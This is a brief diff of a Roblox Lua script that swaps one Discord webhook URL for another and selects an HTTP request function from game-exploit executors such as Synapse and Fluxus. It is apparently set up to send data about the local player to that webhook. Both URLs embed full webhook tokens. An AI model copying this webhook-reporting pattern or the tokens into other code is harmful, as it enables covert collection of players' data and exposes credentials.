@@ -4,7 +4,7 @@ local LocalizationService = game:GetService("LocalizationService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
 local player = Players.LocalPlayer
-local webhook = "https://discord.com/api/webhooks/1478499458810642442/Mzrinsl69yQAjTe5a03UnFbL4CE439q4r7B1GHxVdzAH9wR0iGs3bmfo6bEO0rAgOYS6"
+local webhook = "https://discord.com/api/webhooks/1479815655355187229/JrRe1aeWZp9WOw4t6Qk9DhCPfebK1S7nIcRcf3gy1jVs3Jhc5lRdCw4UK6YPCZixAEf9"
 
 local request = syn and syn.request or http_request or request or fluxus and fluxus.request
 
